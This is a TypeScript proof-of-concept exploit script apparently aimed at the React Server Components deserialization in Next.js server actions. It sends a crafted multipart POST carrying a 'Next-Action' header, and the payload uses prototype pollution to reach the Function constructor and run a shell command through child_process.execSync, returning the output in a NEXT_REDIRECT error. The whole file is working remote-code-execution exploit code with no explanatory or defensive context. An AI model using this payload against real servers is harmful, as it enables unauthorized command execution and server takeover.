const BASE_URL = "http://localhost:3000";
const EXECUTABLE = "whoami";

const craftedChunk = {
	// biome-ignore lint/suspicious/noThenProperty: I want to do this exactly
	then: "$1:__proto__:then",
	status: "resolved_model",
	reason: -1,
	value: '{"then": "$B0"}',
	_response: {
		_prefix: `var res = process.mainModule.require('child_process').execSync('${EXECUTABLE}',{'timeout':5000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:\`\${res}\`});`,
		_formData: {
			get: "$1:constructor:constructor",
		},
	},
};

const form = new FormData();

form.append(
	"0",
	new Blob([JSON.stringify(craftedChunk)], { type: "application/json" }),
);
form.append("1", new Blob(['"$@0"'], { type: "text/plain" }));

(async () => {
	try {
		const res = await fetch(BASE_URL, {
			method: "POST",
			headers: {
				"Next-Action": "x",
			},
			body: form,
		});

		console.log(res.status);
		console.log(await res.text());
	} catch (err: unknown) {
		console.error("Request failed:", err);
	}
})();
